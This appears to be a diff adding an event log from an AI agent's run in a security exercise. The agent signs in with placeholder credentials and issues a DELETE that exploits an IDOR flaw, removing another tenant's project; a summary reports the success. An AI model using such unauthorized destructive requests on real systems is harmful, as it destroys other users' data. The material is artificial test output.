@@ -1,0 +1,38 @@
+[
+  {
+    "event_id": "evt_3ddb9db3d2234d69aee96ad01ea92448",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": {
+        "email": "user_39871415@exercise.invalid",
+        "password": "pw_30692184e9271398"
+      },
+      "method": "POST",
+      "path": "/auth/login",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "event_id": "evt_03694c23e71947e385687729225ff021",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": null,
+      "method": "DELETE",
+      "path": "/v1/projects/d0e2962b-9138-4f25-a98a-0d5284ffa174",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "status": "success",
+    "summary": "Signed in as user_39871415@exercise.invalid and exploited broken object-level authorization (IDOR) by issuing DELETE /v1/projects/d0e2962b-9138-4f25-a98a-0d5284ffa174, which returned 200 OK and removed a project owned by another tenant without ownership verification.",
+    "type": "finish"
+  }
+]
